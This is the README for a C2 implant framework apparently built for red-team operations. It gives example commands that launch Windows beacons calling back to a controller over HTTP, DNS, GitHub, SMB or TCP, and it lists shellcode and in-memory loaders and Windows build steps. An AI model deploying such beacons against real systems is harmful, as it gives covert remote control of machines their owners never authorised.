# Exploration C2 Implant

## Overview

**Exploration** is a lightweight, modular Command and Control (C2) framework designed for red team operations. This repository provides the **Beacon** component implemented in C++ for targeting Windows systems. The corresponding TeamServer and Client components are available in the [C2TeamServer](https://github.com/maxDcb/C2TeamServer) repository.

This project includes multiple Beacons capable of communicating with the TeamServer through a variety of channels. Supported communication methods include HTTP/HTTPS, GitHub, DNS, SMB, and TCP.

## Communication Examples

```bash
# HTTP/HTTPS
BeaconHttp.exe <TEAMSERVER_IP> <LISTENER_PORT> <http|https>
BeaconHttp.exe 10.10.10.10 8443 https
BeaconHttp.exe 10.10.10.10 8080 http

# GitHub
BeaconGithub.exe <GITHUB_USER/REPO> <ACCESS_TOKEN>
BeaconGithub.exe maxDcb/C2Implant ghp_dsfgdfhdf5554456g4fdg465...

# DNS
BeaconDns.exe <DNS_SERVER> <TEAMSERVER_DOMAIN>
BeaconDns.exe 8.8.8.8 bac.superdomain.com

# SMB
BeaconSmb.exe <LISTENER_IP> <PIPE_NAME>
BeaconSmb.exe 127.0.0.1 pipename

# TCP
BeaconTcp.exe <LISTENER_IP> <LISTENER_PORT>
BeaconTcp.exe 127.0.0.1 4444
```

## Build Instructions

### Submodules & External Dependencies

This project relies on several third-party libraries and tools:

* [Donut](https://github.com/TheWover/donut): Generates shellcode from PE files.
* [COFFLoader](https://github.com/trustedsec/COFFLoader): Executes object files such as those in [CS-Situational-Awareness-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF).
* [MemoryModule](https://github.com/fancycode/MemoryModule): Enables runtime DLL loading.
* [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell): Executes PowerShell from unmanaged code.
* [cpp-base64](https://github.com/ReneNyffenegger/cpp-base64): Base64 encoding/decoding.
* [nlohmann/json](https://github.com/nlohmann/json): JSON parsing.

### Preparing the Environment

Install prerequisites:

* [Chocolatey](https://chocolatey.org/install)
* CMake:

```bash
choco install cmake --pre
```

Initialize submodules and set up the build directory:

```bash
git submodule update --init
mkdir buildWindows
cd buildWindows
```

### Building the Windows Beacons and Modules

#### Windows x64

Using the "x64 Native Tools Command Prompt for VS":

```bash
cmake -G "Visual Studio 17 2022" ..

msbuild .\C2Implant.sln /property:Configuration=Release -m
```

Alternatively, open the generated `C2Implant.sln` in Visual Studio and build in **Release** mode. Ensure the Runtime Library is set to **Multi-threaded (/MT)**.

Project can also be build with the C2Core package:

```bash
# download last windows package

set "CMAKE_PREFIX_PATH=path_to_C2Core-Windows" 

cmake -G "Visual Studio 17 2022" ..

msbuild .\C2Implant.sln /property:Configuration=Release -m

```

#### Windows x86

```bash
cmake -G "Visual Studio 17 2022" -A "Win32" ..
msbuild .\C2Implant.sln /property:Configuration=Release /p:Platform=Win32 -m
```

### Output Locations

* Compiled Beacons: `Release\Beacons`
* Compiled Module DLLs: `Release\Modules`
